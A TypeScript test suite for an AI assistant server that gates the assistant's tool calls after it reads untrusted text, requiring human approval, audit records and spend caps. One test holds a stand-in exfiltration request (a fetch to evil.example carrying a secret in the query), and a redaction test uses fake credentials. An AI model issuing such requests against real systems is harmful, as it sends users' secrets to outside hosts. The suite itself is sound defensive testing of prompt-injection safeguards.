/**
 * Review of the P1 server integration (PR #41): taint that outlives a request,
 * runtime results that say they are tainted, outcomes read from the result,
 * eval replays that propose nothing, the audit sink failing closed, rollups
 * that survive a restart, proposals that are never duplicated or stranded,
 * signed policies and caps from the runtime, notifications that keep their
 * words in the console, and the approval routes end to end.
 */
import { describe, it, expect, beforeEach } from 'vitest';
import { createServer, type Server } from 'node:http';
import type { AddressInfo } from 'node:net';
import { existsSync, mkdtempSync, readFileSync, writeFileSync, chmodSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { createHash, generateKeyPairSync, sign as signRaw } from 'node:crypto';
import type { TierDecision } from '@flint/policy';
import type { Tool, Turn } from '@flint/core';
import type { GateRequest } from '@flint/mcp';
import { ActionQueue, keyOf, outcomeOf } from '../src/actions';
import { isSafeTool } from '../src/policy';
import { gateBuiltins, runtimeResultTainted, tierGate, type TierEvent, type TierOutcome } from '../src/tier-gate';
import { historyOrigin, markEval, markTainted, taintFromHistory, turnProposals, turnTainted, withTurnTaint } from '../src/turn-taint';
import { ConversationTaint } from '../src/conversation-taint';
import { AuditSink, AuditUnavailable, type AuditRecord } from '../src/audit-sink';
import { RuntimeProposals } from '../src/runtime-proposals';
import { RuntimePolicies, capClaimer, parsePolicies } from '../src/runtime-link';
import { Approvals, type ApproverStore, type Credential } from '../src/approvals';
import { approvalRoutes, executeApproved, type ApprovalDeps } from '../src/approval-routes';
import { KnowledgeStore } from '../src/knowledge';
import { MemoryExtractor } from '../src/memory-extract';
import { SpendGuard, SpendLedger } from '../src/spend';
import { startInternal } from '../src/internal';

const tmp = (p = 'flint-r41-') => mkdtempSync(join(tmpdir(), p));
const RT = { url: 'http://[::1]:8090', token: 'a'.repeat(64) };
const tool = (name: string, fn: (args: unknown) => unknown): Tool => ({ definition: { name, description: name, inputSchema: { type: 'object' } }, handler: async (c) => fn(c.args) });

// ---- taint across turns -------------------------------------------------------------

describe('conversation taint', () => {
  const H = 3600_000;
  it('a turn that read untrusted text taints the turns whose history still carries it, for one window after the read', () => {
    const file = join(tmp(), 'taint.json');
    const t = new ConversationTaint(file);
    const now = 1_800_000_000_000;
    t.mark('c1', ['t1'], now - 2 * H);
    expect(t.origin('c1', ['t0', 't1'], now, 48 * H)).toBe(now - 2 * H);
    expect(t.origin('c1', ['t2', 't3'], now, 48 * H)).toBeUndefined(); // t1 left the window
    expect(t.origin('c2', ['t1'], now, 48 * H)).toBeUndefined();
    // A turn tainted only by its history inherits that origin, so the chain ends one window after the read.
    t.mark('c1', ['t2'], now - 2 * H);
    expect(t.origin('c1', ['t2'], now, 48 * H)).toBe(now - 2 * H);
    expect(t.origin('c1', ['t2'], now + 47 * H, 48 * H)).toBeUndefined();
    // With no age limit, it never ends.
    expect(t.origin('c1', ['t2'], now + 1000 * H)).toBe(now - 2 * H);
    // Survives a restart; the extractor sees every recorded turn, of any age.
    const again = new ConversationTaint(file);
    expect(again.isTainted('c1', 't1')).toBe(true);
    expect(again.isTainted('c1', 't2')).toBe(true);
  });

  it('the first file format (ids only) still taints, as recent', () => {
    const file = join(tmp(), 'taint.json');
    writeFileSync(file, JSON.stringify({ c: ['t1'] }));
    expect(new ConversationTaint(file).origin('c', ['t1'], Date.now(), 48 * H)).toBeDefined();
  });

  it('an unreadable record fails closed, and is left for Will to look at', () => {
    const file = join(tmp(), 'taint.json');
    writeFileSync(file, '{not json');
    const logs: string[] = [];
    const t = new ConversationTaint(file, (m) => logs.push(m));
    expect(t.origin('any', ['x'], Date.now(), H)).toBeDefined();
    expect(t.origin('any', [], Date.now(), H)).toBeUndefined();
    t.mark('c', ['y'], Date.now());
    expect(readFileSync(file, 'utf8')).toBe('{not json');
    expect(logs[0]).toMatch(/unreadable/);
  });

  it('history is checked when the model is handed it, so a turn that committed meanwhile is not missed', async () => {
    const { PersistentStore } = await import('../src/persistent-store');
    const dir = tmp();
    const store = new PersistentStore(join(dir, 'c.json'), { history: null });
    const t = new ConversationTaint(join(dir, 'taint.json'));
    store.onHistory = (cid, ids) => {
      const o = t.origin(cid, ids, Date.now());
      if (o !== undefined) taintFromHistory(o);
    };
    const at = Date.now();
    await store.beginTurn({ conversationId: 'c', turnId: 'A', userMessage: { id: 'u', role: 'user', content: 'notes?', timestamp: at }, createdAt: at });
    // Turn B starts (its early checks see nothing), then A commits, tainted, before B reads its history.
    const b = withTurnTaint(async () => {
      await new Promise((r) => setTimeout(r, 20));
      await store.getMessages('c');
      return { tainted: turnTainted(), origin: historyOrigin() };
    });
    await store.commitTurn({ conversationId: 'c', turnId: 'A', responseMessages: [], usage: { input: 0, output: 0 }, updatedAt: at + 1 });
    t.mark('c', ['A'], at);
    expect(await b).toEqual({ tainted: true, origin: at });
  });

  it('a later turn that starts tainted by its history needs approval to fetch', async () => {
    const queue = new ActionQueue(isSafeTool);
    const gate = tierGate({ queue });
    const req: GateRequest = { server: 'web', tool: 'fetch_url', fullName: 'web.fetch_url', annotations: { readOnlyHint: true }, args: { url: 'https://evil.example/?k=SECRET' } };
    // Turn 2, clean on its own: the fetch runs.
    expect(await withTurnTaint(() => gate.check(req))).toEqual({ allow: true, meta: { 'flint/tainted': false } });
    // Turn 2 whose history holds turn 1's tainted read (index.ts marks it 'history'): approval.
    const d = await withTurnTaint(async () => {
      markTainted('history');
      return gate.check(req);
    });
    expect(d).toMatchObject({ allow: false });
  });

  it('the memory extractor never mines a tainted turn (or uses one as context)', async () => {
    const dir = tmp();
    const mk = (id: string, user: string, at: number): Turn => ({
      id, conversationId: 'c', status: 'complete', createdAt: at, updatedAt: at,
      messages: [{ id: `u${id}`, role: 'user', content: user, timestamp: at }, { id: `a${id}`, role: 'assistant', content: `reply ${id}`, timestamp: at }],
    });
    const turns = [mk('t1', 'Read this page about my status dashboard at evil.example please', 1_780_000_000_000), mk('t2', 'My sister Ana lives in Austin and loves tacos', 1_780_000_060_000)];
    const prompts: string[] = [];
    const ex = new MemoryExtractor(
      { conversationIds: () => ['c'], getTurns: async () => structuredClone(turns) },
      new KnowledgeStore(join(dir, 'k.json'), { embed: async () => { throw new Error('down'); } } as unknown as ConstructorParameters<typeof KnowledgeStore>[1]),
      () => ({ generate: async (i: { system: string; prompt: string }) => (prompts.push(i.prompt), { text: '[]' }) }),
      join(dir, 's.json'),
      { isTainted: (_c, t) => t === 't1' },
    );
    await ex.run();
    expect(ex.lastStats.skippedTainted).toBe(1);
    expect(prompts.join('\n')).toContain('Ana');
    expect(prompts.join('\n')).not.toContain('evil.example');
  });
});

describe('runtime results and the gate', () => {
  it('reads the runtime\'s own taint marks through the JSON escaping; anything else counts as tainted', () => {
    expect(runtimeResultTainted(JSON.stringify({ entity: { id: 'e1', taintedPaths: [] }, tainted: false }, null, 2))).toBe(false);
    expect(runtimeResultTainted(JSON.stringify({ entity: { id: 'e1' }, tainted: true }, null, 2))).toBe(true);
    expect(runtimeResultTainted(JSON.stringify({ predictions: [{ id: 'p', tainted: false }, { id: 'q', taintedPaths: ['claim'] }] }))).toBe(true);
    expect(runtimeResultTainted('not json')).toBe(true);
    expect(runtimeResultTainted({ isError: true, content: 'runtime HTTP 500' })).toBe(true);
    expect(runtimeResultTainted([{ type: 'image' }])).toBe(true);
  });

  it('a tainted world read taints the turn; a clean one does not', async () => {
    const gate = tierGate({ queue: new ActionQueue(isSafeTool) });
    const req: GateRequest = { server: 'runtime', tool: 'world_entity', fullName: 'runtime.world_entity', annotations: { readOnlyHint: true }, args: {} };
    expect(await withTurnTaint(async () => (gate.onResult!(req, JSON.stringify({ tainted: false }, null, 2)), turnTainted()))).toBe(false);
    expect(await withTurnTaint(async () => (gate.onResult!(req, JSON.stringify({ tainted: true }, null, 2)), turnTainted()))).toBe(true);
  });

  it('a prediction recorded in a tainted turn is stored as tainted, whatever the model sent', async () => {
    const promote = () => [{ pattern: 'ledger_record_prediction', tier: 'alone' as const, dailyCap: 5, active: true, expiresAt: '2099-01-01T00:00:00Z' }];
    const gate = tierGate({ queue: new ActionQueue(isSafeTool), policies: promote, claimCap: async () => 'ok' });
    const req: GateRequest = { server: 'runtime', tool: 'ledger_record_prediction', fullName: 'runtime.ledger_record_prediction', annotations: {}, args: { claim: 'x', tainted: false } };
    // Untainted: the call carries tainted false in its _meta (the model's own field is ignored by the connector).
    expect(await withTurnTaint(() => gate.check(req))).toEqual({ allow: true, meta: { 'flint/tainted': false } });
    // Approved from a tainted turn and run on its allowance, with a template: tainted.
    const templated = { ...req, args: { template: { id: 'service_healthy', params: {} } } };
    const run = await withTurnTaint(() => gate.check(templated), { sources: ['proposal'], allow: [keyOf('runtime', 'ledger_record_prediction', templated.args)] });
    expect(run).toEqual({ allow: true, meta: { 'flint/tainted': true } });
    // Free text from a tainted turn is refused before anyone is asked to approve it.
    expect(await withTurnTaint(() => gate.check(req), { sources: ['mcp:web'] })).toMatchObject({ allow: false, message: expect.stringMatching(/claim template/) });
  });

  it('a promoted action\'s cap is claimed first: used up is refused, unknown asks Will', async () => {
    const promote = () => [{ pattern: 'ledger_record_prediction', tier: 'alone' as const, dailyCap: 5, active: true, expiresAt: '2099-01-01T00:00:00Z' }];
    const req: GateRequest = { server: 'runtime', tool: 'ledger_record_prediction', fullName: 'runtime.ledger_record_prediction', annotations: {}, args: { claim: 'x' } };
    const claimed: TierDecision[] = [];
    const events: TierEvent[] = [];
    const ok = tierGate({ queue: new ActionQueue(isSafeTool), policies: promote, claimCap: async (d) => (claimed.push(d), 'ok') });
    expect((await withTurnTaint(() => ok.check(req))).allow).toBe(true);
    expect(claimed[0]).toMatchObject({ key: 'ledger_record_prediction', cap: { limit: 5, period: 'day' } });
    const capped = tierGate({ queue: new ActionQueue(isSafeTool), policies: promote, claimCap: async () => 'capped', onDecision: (e) => events.push(e) });
    expect(await withTurnTaint(() => capped.check(req))).toMatchObject({ allow: false, message: expect.stringMatching(/cap of 5 a day is used up/) });
    expect(events.at(-1)).toMatchObject({ status: 'denied' });
    const queue = new ActionQueue(isSafeTool);
    const down = tierGate({ queue, policies: promote, claimCap: async () => 'unavailable' });
    expect(await withTurnTaint(() => down.check(req))).toMatchObject({ allow: false, message: expect.stringMatching(/needs Will's approval/) });
    expect(queue.list()).toHaveLength(1);
    // No claimer at all: the same.
    expect((await withTurnTaint(() => tierGate({ queue: new ActionQueue(isSafeTool), policies: promote }).check(req))).allow).toBe(false);
  });

  it('records refusals, RAM-queued calls with their proposal id, ALONE writes as pending then their outcome; reads are counted', async () => {
    const events: TierEvent[] = [];
    const outcomes: TierOutcome[] = [];
    const queue = new ActionQueue(isSafeTool);
    const [remember, calc] = gateBuiltins(
      [tool('remember', () => ({ isError: true, content: 'disk full at /Users/will/secret' })), tool('calculate', () => 4)],
      { queue, onDecision: (e) => events.push(e), onOutcome: (o) => outcomes.push(o) },
    );
    await withTurnTaint(async () => {
      await calc!.handler({ id: '1', toolName: 'calculate', args: {} });
      await remember!.handler({ id: '2', toolName: 'remember', args: { fact: 'a' } });
      markTainted('mcp:web');
      await remember!.handler({ id: '3', toolName: 'remember', args: { fact: 'b' } });
      expect(turnProposals().map((p) => p.fullName)).toEqual(['remember']);
    });
    expect(events.map((e) => e.status)).toEqual(['read', 'acting', 'queued']);
    expect(events[1]!.correlationId).toMatch(/^call:/);
    expect(outcomes).toEqual([expect.objectContaining({ correlationId: events[1]!.correlationId, ok: false, error: 'the tool reported an error' })]);
    expect(JSON.stringify(outcomes)).not.toContain('secret');
    expect(events[2]!.correlationId).toBe(`act:${queue.list()[0]!.id}`);
  });

  it('an eval replay queues nothing and proposes nothing, even inside deep_research', async () => {
    const queue = new ActionQueue(isSafeTool);
    const filed: unknown[] = [];
    const proposals = { propose: async (p: unknown) => (filed.push(p), { id: 'pr1' }) } as unknown as RuntimeProposals;
    const [remember] = gateBuiltins([tool('remember', () => 'ok')], { queue, proposals });
    const out = (await withTurnTaint(async () => {
      markEval();
      markTainted('mcp:web');
      return remember!.handler({ id: '1', toolName: 'remember', args: { fact: 'x' } });
    })) as { message: string };
    expect(out.message).toMatch(/eval replay/);
    expect(filed).toEqual([]);
    expect(queue.list()).toEqual([]);
  });
});

// ---- outcomes and the RAM queue ----------------------------------------------------

describe('outcomes', () => {
  it('an MCP error or a gate refusal is a failure; the audit class never carries the tool\'s words', () => {
    expect(outcomeOf('ok')).toEqual({ ok: true });
    expect(outcomeOf({ isError: true, content: 'bob@example.com not found' })).toEqual({ ok: false, error: 'the tool reported an error', detail: 'bob@example.com not found' });
    expect(outcomeOf({ approved: false, message: 'queued' })).toMatchObject({ ok: false, error: 'not executed: refused by the gate' });
  });

  it('RAM ids are unique across restarts; an approved call that errors is an error, and runs in a scope as tainted as its proposal', async () => {
    let sawTaint: boolean | undefined;
    const q = new ActionQueue(isSafeTool);
    const id = await withTurnTaint(async () => (markTainted('mcp:web'), q.capture({ server: 'gcal', tool: 'create_event', fullName: 'gcal.create_event', args: { t: 1 }, destructive: false })));
    expect(id).toMatch(/^act-[0-9a-f]{6}-1$/);
    const a = await q.approve(id, [tool('gcal.create_event', () => ((sawTaint = turnTainted()), { isError: true, content: 'quota' }))]);
    expect(a).toMatchObject({ status: 'error', error: 'quota' });
    expect(sawTaint).toBe(true);
    // Not approvable twice.
    expect((await q.approve(id, []))!.status).toBe('error');
  });
});

// ---- the audit sink ---------------------------------------------------------------------

describe('audit sink', () => {
  const entry = { actor: 'flint', context: 'chat' as const, kind: 'decision' as const, action: 'x', inputs: {}, outcome: 'pending' as const };

  it('an intent that cannot be made durable throws, so its action never runs', () => {
    const sink = new AuditSink({ spoolDir: tmp(), maxBytes: 10 });
    expect(() => sink.record({ ...entry, kind: 'intent' }, true)).toThrow(AuditUnavailable);
    // A non-durable entry is dropped with a log line, not thrown.
    expect(() => sink.record(entry)).not.toThrow();
    const dir = tmp();
    const s2 = new AuditSink({ spoolDir: dir });
    chmodSync(dir, 0o500);
    try {
      expect(() => s2.record({ ...entry, kind: 'intent' }, true)).toThrow(AuditUnavailable);
    } finally {
      chmodSync(dir, 0o700);
    }
  });

  it('one entry the runtime refuses does not lose the other 99: it is set aside alone', async () => {
    const dir = tmp();
    const shipped: AuditRecord[] = [];
    const fetchImpl = (async (_u: string, init: RequestInit) => {
      const batch = JSON.parse(String(init.body)) as AuditRecord[];
      if (batch.some((e) => e.action === 'bad')) return new Response('{}', { status: 400 });
      shipped.push(...batch);
      return new Response('{}', { status: 200 });
    }) as typeof fetch;
    const sink = new AuditSink({ spoolDir: dir, runtime: () => RT, fetchImpl });
    for (let i = 0; i < 5; i++) sink.record({ ...entry, action: i === 2 ? 'bad' : `ok${i}` });
    await sink.flush();
    expect(shipped.map((e) => e.action)).toEqual(['ok0', 'ok1', 'ok3', 'ok4']);
    expect(readFileSync(join(dir, 'audit.rejected.jsonl'), 'utf8')).toContain('"bad"');
    expect(existsSync(join(dir, 'audit.shipping.jsonl'))).toBe(false);
  });

  it('read counts survive a restart, ship in batches of at most 500, and keep what was counted meanwhile', async () => {
    const dir = tmp();
    const a = new AuditSink({ spoolDir: dir, tz: 'America/Chicago' });
    for (let i = 0; i < 1201; i++) a.count(`tool${i}`, 'chat');
    a.count('tool0', 'chat');
    a.saveRollups();
    const sizes: number[] = [];
    let b: AuditSink;
    const ids = new Set<string>();
    let total = 0;
    const fetchImpl = (async (_u: string, init: RequestInit) => {
      const body = JSON.parse(String(init.body)) as { batchId: string; rows: Array<{ n: number }> };
      ids.add(body.batchId);
      sizes.push(body.rows.length);
      total += body.rows.reduce((a, r) => a + r.n, 0);
      if (sizes.length === 1) b.count('late', 'chat'); // counted while a batch is in flight
      return new Response('{}', { status: 200 });
    }) as typeof fetch;
    b = new AuditSink({ spoolDir: dir, runtime: () => RT, fetchImpl, tz: 'America/Chicago' });
    await b.flush();
    expect(sizes).toEqual([500, 500, 202]);
    expect(ids.size).toBe(3);
    expect(total).toBe(1201 + 1 + 1);
    expect(JSON.parse(readFileSync(join(dir, 'rollups.json'), 'utf8'))).toEqual({ counts: {} });
  });

  it('a batch whose reply was lost is resent with the same id, even after a restart', async () => {
    const dir = tmp();
    const a = new AuditSink({ spoolDir: dir, runtime: () => RT, fetchImpl: (async () => { throw new Error('reply lost'); }) as typeof fetch });
    a.count('tool', 'chat');
    await a.flush();
    const sent: string[] = [];
    const b = new AuditSink({ spoolDir: dir, runtime: () => RT, fetchImpl: (async (_u: string, init: RequestInit) => (sent.push(JSON.parse(String(init.body)).batchId), new Response('{}', { status: 200 }))) as typeof fetch });
    const first = (JSON.parse(readFileSync(join(dir, 'rollups.json'), 'utf8')) as { inflight: { id: string } }).inflight.id;
    await b.flush();
    expect(sent).toEqual([first]);
  });
});

// ---- runtime proposals --------------------------------------------------------------------

describe('runtime proposals', () => {
  it('a .sending file stranded by a crash is sent; two replays at once send each line once', async () => {
    const dir = tmp();
    const sent: string[] = [];
    const fetchImpl = (async (_u: string, init: RequestInit) => {
      await new Promise((r) => setTimeout(r, 20));
      sent.push(JSON.parse(String(init.body)).action);
      return new Response(JSON.stringify({ id: 'pr' }), { status: 201 });
    }) as typeof fetch;
    const line = (action: string) => `${JSON.stringify({ kind: 'tool_call', origin: 'chat:x', action, args: {}, argsProvenance: {}, tainted: false })}\n`;
    writeFileSync(join(dir, 'proposals.jsonl.sending'), line('mcp:a.one'), { mode: 0o600 });
    const p = new RuntimeProposals({ runtime: () => RT, spoolDir: dir, fetchImpl });
    expect(p.unsynced()).toBe(1);
    // Both callers share the one replay in flight.
    const [x, y] = await Promise.all([p.replay(), p.replay()]);
    expect([x, y]).toEqual([1, 1]);
    expect(sent).toEqual(['mcp:a.one']);
    expect(p.unsynced()).toBe(0);
  });

  it('how an execution ended is spooled when the runtime cannot take it, and sent later', async () => {
    const dir = tmp();
    let up = false;
    const completed: unknown[] = [];
    const fetchImpl = (async (u: string, init: RequestInit) => {
      if (!up) throw new Error('ECONNREFUSED');
      if (u.endsWith('/complete')) completed.push(JSON.parse(String(init.body)));
      return new Response('{}', { status: 200 });
    }) as typeof fetch;
    const p = new RuntimeProposals({ runtime: () => RT, spoolDir: dir, fetchImpl });
    expect(await p.completeDurably('pr1', { ok: true, result: { value: 1 } })).toBe('spooled');
    expect(existsSync(join(dir, 'outcomes.jsonl'))).toBe(true);
    up = true;
    await p.replay();
    expect(completed).toEqual([{ ok: true, result: { value: 1 } }]);
  });

  it('get() is one request by id, and a missing proposal is undefined', async () => {
    const urls: string[] = [];
    const fetchImpl = (async (u: string) => (urls.push(u), new Response(JSON.stringify({ error: 'no such proposal' }), { status: 404 }))) as typeof fetch;
    const p = new RuntimeProposals({ runtime: () => RT, spoolDir: tmp(), fetchImpl });
    expect(await p.get('pr9')).toBeUndefined();
    expect(urls).toEqual([`${RT.url}/v1/proposals/pr9`]);
  });
});

// ---- policies and caps from the runtime --------------------------------------------------

describe('runtime link', () => {
  const row = (tier: string, pattern = 'world_now') => ({ pattern, tier, dailyCap: null, active: true, expiresAt: '2099-01-01T00:00:00.000Z' });

  it('takes the signed rows, keeps them on disk, and once stale uses only the ones that tighten', async () => {
    const file = join(tmp(), 'policies.json');
    let now = 1_000_000;
    const fetchImpl = (async () => new Response(JSON.stringify({ policies: [row('alone'), row('forbidden', 'web.*'), { pattern: 7 }] }), { status: 200 })) as typeof fetch;
    const p = new RuntimePolicies({ runtime: () => RT, file, fetchImpl, now: () => now });
    expect(await p.refresh()).toBe(true);
    expect(p.current().map((r) => r.tier)).toEqual(['alone', 'forbidden']);
    now += 11 * 60_000;
    expect(p.current().map((r) => r.tier)).toEqual(['forbidden']);
    // A restart with the runtime down still knows the tightening.
    const again = new RuntimePolicies({ runtime: () => undefined, file, now: () => now });
    expect(again.current().map((r) => r.pattern)).toEqual(['web.*']);
    expect(parsePolicies([{ ...row('alone'), active: false }])).toEqual([]);
  });

  it('a cap claim is ok, used up (429), or unknown', async () => {
    const d = { tier: 'alone', rule: 'policy', reason: 'r', key: 'world_now', cap: { limit: 3, period: 'day' } } as TierDecision;
    const at = (status: number) => capClaimer(() => RT, (async () => new Response('{}', { status })) as typeof fetch);
    expect(await at(200)(d)).toBe('ok');
    expect(await at(429)(d)).toBe('capped');
    expect(await at(500)(d)).toBe('unavailable');
    expect(await capClaimer(() => RT, (async () => { throw new Error('down'); }) as typeof fetch)(d)).toBe('unavailable');
    expect(await capClaimer(() => undefined)(d)).toBe('unavailable');
  });
});

// ---- notifications and unified spend -------------------------------------------------------

describe('internal listener', () => {
  it('a runtime notification is redacted; a raw payload is refused', async () => {
    const notes: Array<[string, string]> = [];
    const TOKEN = 'runtime-to-server-0123456789abcdef';
    const s = startInternal({ tokenSha256: () => createHash('sha256').update(TOKEN).digest('hex'), notify: (t, b) => (/^\s*[{[]/.test(b) ? 'refused' : (notes.push([t, b]), 'stored')), spendExternal: () => {} }, 0);
    await new Promise((r) => s.once('listening', r));
    const post = (body: unknown) => fetch(`http://[::1]:${(s.address() as AddressInfo).port}/internal/notify`, { method: 'POST', headers: { authorization: `Bearer ${TOKEN}` }, body: JSON.stringify(body) });
    expect((await post({ title: 'offsite failed', body: 'pg_dump: password=hunter2hunter2 sk-ant-api03-abcdefghijklmnopqrstuv' })).status).toBe(200);
    expect(notes[0]![1]).not.toMatch(/sk-ant-api03/);
    expect((await post({ title: 'x', body: '{"raw":1}' })).status).toBe(422);
    s.close();
  });

  it('the unified view stops background work at 70% of Flint\'s cap', () => {
    const NOON = Date.parse('2026-10-01T17:00:00Z');
    const ledger = new SpendLedger({ dir: tmp(), timeZone: 'America/Chicago', now: () => NOON });
    const caps = { anthropic: { dailyUsd: 10 }, openai: {}, perplexity: {}, tavily: {} } as ConstructorParameters<typeof SpendGuard>[1];
    const g = new SpendGuard(ledger, caps);
    expect(g.backgroundBlocked('anthropic', NOON)).toBeUndefined();
    g.setExternal({ asOf: new Date(NOON).toISOString(), vendors: { anthropic: { dayUsd: 7.5, monthUsd: 7.5 } } });
    expect(g.backgroundBlocked('anthropic', NOON)).toMatch(/75% of Flint's cap across every account/);
    // Stale totals are not trusted.
    expect(g.backgroundBlocked('anthropic', NOON + 3 * 3600_000)).toBeUndefined();
  });
});

// ---- the approval routes, end to end ----------------------------------------------------------

function memoryStore() {
  const creds: Array<Credential & { enrolledVia: string }> = [];
  const store: ApproverStore = {
    credentials: async () => creds,
    addCredential: async (c) => void creds.push({ ...c, revokedAt: null }),
    addApproval: async () => {},
    setSignCount: async () => {},
    revoke: async () => {},
    replace: async (add) => void (add && creds.push({ ...add, revokedAt: null })),
  };
  return { store, creds };
}

function fakeRuntime(proposal: Record<string, unknown>) {
  const calls: string[] = [];
  let claimStatus = 200;
  let completeUp = true;
  const fetchImpl = (async (u: string, init: RequestInit = {}) => {
    const path = new URL(u).pathname;
    calls.push(`${init.method ?? 'GET'} ${path}`);
    if (path.endsWith('/claim')) return claimStatus === 200 ? Response.json({ id: proposal.id, action: proposal.action, args: proposal.args, argsDigest: 'd' }) : Response.json({ error: 'cap reached' }, { status: claimStatus });
    if (path.endsWith('/complete')) {
      if (!completeUp) throw new Error('ECONNRESET');
      return Response.json({ ok: true });
    }
    if (path.endsWith('/run')) return Response.json({ error: `${proposal.action} is not carried out by the runtime` }, { status: 409 });
    if (path === `/v1/proposals/${proposal.id}`) return Response.json({ proposal });
    return Response.json({ error: 'nope' }, { status: 404 });
  }) as typeof fetch;
  return { calls, fetchImpl, setClaim: (s: number) => (claimStatus = s), setComplete: (up: boolean) => (completeUp = up) };
}

describe('approval routes', () => {
  let server: Server | undefined;
  let deps: ApprovalDeps;
  let audit: Array<Record<string, unknown>>;
  let notes: string[];
  let ran: unknown[];
  const base = () => `http://[::1]:${(server!.address() as AddressInfo).port}`;
  const post = (path: string, body: unknown) => fetch(`${base()}${path}`, { method: 'POST', body: JSON.stringify(body) }).then(async (r) => ({ status: r.status, body: (await r.json()) as Record<string, unknown> }));

  async function serve(d: ApprovalDeps) {
    deps = d;
    server?.close();
    server = createServer((req, res) => void approvalRoutes(req, res, req.url ?? '/', deps).then((h) => { if (!h) { res.writeHead(404); res.end(); } }));
    await new Promise<void>((r) => server!.listen(0, '::1', r));
  }

  beforeEach(() => {
    audit = [];
    notes = [];
    ran = [];
  });

  const baseDeps = (over: Partial<ApprovalDeps> = {}): ApprovalDeps => ({
    actions: new ActionQueue(isSafeTool),
    tools: [tool('gcal.create_event', (a) => (ran.push(a), { isError: true, content: 'quota for bob@example.com' }))],
    audit: { record: (e: Record<string, unknown>) => (audit.push(e), e) } as unknown as ApprovalDeps['audit'],
    notes: { push: (t: string) => (notes.push(t), undefined) } as unknown as ApprovalDeps['notes'],
    approvals: undefined,
    proposals: undefined,
    errorRef: () => 'ref',
    ...over,
  });

  it('one tap works only until Will has a key; with a key (or keys that cannot be checked) it is refused', async () => {
    const mem = memoryStore();
    const approvals = new Approvals({ store: mem.store, enrollCodeFile: join(tmp(), 'code') });
    const d = baseDeps({ approvals });
    const id = d.actions.capture({ server: 'gcal', tool: 'create_event', fullName: 'gcal.create_event', args: { t: 1 }, destructive: false });
    await serve(d);
    // No key yet: one tap runs it, the failure is a failure, and the audit keeps no tool words.
    const r = await post('/proposals/approve', { id });
    expect(r.status).toBe(200);
    expect(r.body.action).toMatchObject({ status: 'error' });
    expect(audit.map((e) => [e.kind, e.outcome])).toEqual([['intent', 'pending'], ['action', 'failed']]);
    expect(JSON.stringify(audit)).not.toContain('bob@example.com');
    expect(notes).toEqual([]);
    // A key enrolled: refused.
    mem.creds.push({ credentialId: 'c', factor: 'webauthn', publicKey: Buffer.alloc(1), label: 'phone', signCount: 0, revokedAt: null, enrolledVia: 'enroll_code' });
    const id2 = d.actions.capture({ server: 'gcal', tool: 'create_event', fullName: 'gcal.create_event', args: { t: 2 }, destructive: false });
    expect((await post('/proposals/approve', { id: id2 })).status).toBe(403);
    // The key store unreachable: refused too.
    const broken = new Approvals({ store: { ...mem.store, credentials: async () => { throw new Error('db down'); } }, enrollCodeFile: join(tmp(), 'code') });
    await serve(baseDeps({ approvals: broken, actions: d.actions }));
    expect((await post('/proposals/approve', { id: id2 })).status).toBe(403);
    expect(ran).toHaveLength(1);
  });

  it('no intent on disk, no action', async () => {
    const d = baseDeps({ audit: { record: (_e: unknown, durable?: boolean) => { if (durable) throw new AuditUnavailable('full'); return {}; } } as unknown as ApprovalDeps['audit'] });
    const id = d.actions.capture({ server: 'gcal', tool: 'create_event', fullName: 'gcal.create_event', args: { t: 3 }, destructive: false });
    await serve(d);
    expect((await post('/proposals/approve', { id })).status).toBe(503);
    expect(ran).toEqual([]);
  });

  it('a runtime proposal: wired tools are claimed, run in a scope as tainted as the proposal, and how they ended is reported (spooled if need be)', async () => {
    let tainted: boolean | undefined;
    const proposal = { id: 'pr1', origin: 'chat:t', action: 'mcp:gcal.create_event', args: { t: 1 }, tainted: true, status: 'approved' };
    const rt = fakeRuntime(proposal);
    const proposals = new RuntimeProposals({ runtime: () => RT, spoolDir: tmp(), fetchImpl: rt.fetchImpl });
    const d = baseDeps({ proposals, tools: [tool('gcal.create_event', () => ((tainted = turnTainted()), 'created'))] });
    rt.setComplete(false);
    const out = await executeApproved(d, 'pr1');
    expect(out).toMatchObject({ status: 'done', note: expect.stringMatching(/told how it ended/) });
    expect(tainted).toBe(true);
    expect(rt.calls).toContain('POST /v1/proposals/pr1/claim');
    expect(proposals.unsynced()).toBe(0); // proposals spool, not outcomes
    // A cap reached leaves it approved.
    rt.setClaim(429);
    expect(await executeApproved(d, 'pr1')).toMatchObject({ status: 'approved', note: expect.stringMatching(/cap reached/) });
  });

  it('a runtime job\'s own proposal (a nightly backup) is never claimed by the server', async () => {
    const proposal = { id: 'pr2', origin: 'runtime:backup', action: 'backup.local', args: {}, tainted: false, status: 'approved' };
    const rt = fakeRuntime(proposal);
    const proposals = new RuntimeProposals({ runtime: () => RT, spoolDir: tmp(), fetchImpl: rt.fetchImpl });
    const out = await executeApproved(baseDeps({ proposals }), 'pr2');
    expect(out).toMatchObject({ status: 'approved', note: expect.stringMatching(/runtime job/) });
    expect(rt.calls.some((c) => c.endsWith('/claim'))).toBe(false);
  });

  it('enrolling a second key from another device: pending, approved there, finished here', async () => {
    const dir = tmp();
    const code = join(dir, 'code');
    writeFileSync(code, 'abcd-efgh-ijkl-mnop\n');
    const mem = memoryStore();
    const approvals = new Approvals({ store: mem.store, enrollCodeFile: code });
    await serve(baseDeps({ approvals }));
    const key = () => {
      const k = generateKeyPairSync('ec', { namedCurve: 'prime256v1' });
      return { pub: k.publicKey.export({ format: 'der', type: 'spki' }).toString('base64url'), sign: (c: string) => signRaw('sha256', Buffer.from(c, 'base64url'), k.privateKey).toString('base64url') };
    };
    const mac = key();
    const b1 = await post('/approvals/enroll/begin', { code: 'abcd-efgh-ijkl-mnop', label: 'Mac' });
    expect(b1.body.needsApproval).toBe(false);
    await post('/approvals/enroll/finish', { challengeId: b1.body.challengeId, factor: 'secure_enclave', publicKey: mac.pub, signature: mac.sign(String(b1.body.challenge)) });
    const macId = mem.creds[0]!.credentialId;
    writeFileSync(code, 'qrst-uvwx-yz12-3456\n');
    const other = key();
    const b2 = await post('/approvals/enroll/begin', { code: 'qrst-uvwx-yz12-3456', label: 'second Mac' });
    expect(b2.body.needsApproval).toBe(true);
    const reg = { challengeId: b2.body.challengeId, factor: 'secure_enclave', publicKey: other.pub, signature: other.sign(String(b2.body.challenge)) };
    const ap = await post('/approvals/enroll/approve-begin', reg);
    const pending = (await (await fetch(`${base()}/approvals/enroll/pending`)).json()) as { pending: Array<{ challengeId: string; challenge: string }> };
    expect(pending.pending.map((p) => p.challengeId)).toEqual([ap.body.challengeId]);
    await post('/approvals/enroll/approve-finish', { challengeId: ap.body.challengeId, credentialId: macId, signature: mac.sign(pending.pending[0]!.challenge) });
